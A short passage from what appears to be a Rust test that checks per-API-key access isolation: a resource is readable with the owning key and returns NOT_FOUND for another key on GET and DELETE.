        call("GET", path.clone(), "key-a", None).await.0,
        StatusCode::OK
    );
    assert_eq!(
        call("GET", path.clone(), "key-b", None).await.0,
        StatusCode::NOT_FOUND
    );
    assert_eq!(
        call("DELETE", path, "key-b", None).await.0,
        StatusCode::NOT_FOUND
    );
}
